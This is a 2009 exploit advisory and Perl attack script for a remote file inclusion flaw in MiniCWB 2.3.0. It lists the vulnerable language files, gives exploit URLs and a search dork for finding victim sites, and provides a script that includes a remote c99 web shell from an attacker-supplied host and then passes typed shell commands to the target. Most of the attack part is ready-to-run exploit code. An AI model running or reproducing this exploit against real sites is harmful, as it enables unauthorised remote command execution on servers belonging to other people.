#================================================================================================
#
#
#  [o] MiniCWB 2.3.0 Multiple Remote File Inclusion Vulnerability
#
#       Software : MiniCWB version 2.3.0
#       Vendor   : http://www.grafxsoftware.com/
#       Download : http://www.grafxsoftware.com/login.php?action=form&url=download.php
#       Author   : NoGe
#       Contact  : noge[dot]code[at]gmail[dot]com
#       Blog     : http://evilc0de.blogspot.com
#
#
#================================================================================================
#
#
#  [o] Vulnerable file
#
#
#       include($LANG.".extra.php");
#
#        language/en.inc.php
#        language/hu.inc.php
#        language/no.inc.php
#        language/ro.inc.php
#        language/ru.inc.php
#
#
#
#
#  [o] Exploit
#
#       http://localhost/[path]/language/en.inc.php?LANG=[evilc0de]
#       http://localhost/[path]/language/hu.inc.php?LANG=[evilc0de]
#       http://localhost/[path]/language/no.inc.php?LANG=[evilc0de]
#       http://localhost/[path]/language/ro.inc.php?LANG=[evilc0de]
#       http://localhost/[path]/language/ru.inc.php?LANG=[evilc0de]
#
#
#
#  [o] Dork
#
#       "Powered by MiniCWB"
#
#
#================================================================================================
#
#
#  [o] Greetz
#
#       MainHack BrotherHood [ http://news.serverisdown.org ]
#       Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang
#       H312Y yooogy mousekill }^-^{ loqsa zxvf
#       skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke
#
#
#
#  [o] Special
#
#       All victim Jakarta Explosion in JW Marriot and The Ritz-Carlton [ Friday July 17 2009 ]
#       fuck terorism!! you're not make us afraid but you make us more stronger.
#
#        
#================================================================================================
#
# milw0rm.com [2009-07-20]



use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] MiniCWB 2.3.0  Remote File Inclusion Exploit (II)\n\n";
	print "[x] Author NoGe\n";
	print "[x] email:  noge[dot]code[at]gmail[dot]com\n";
	print "[x] Website: http://evilc0de.blogspot.com\n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/language/hu.inc.php?LANG=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

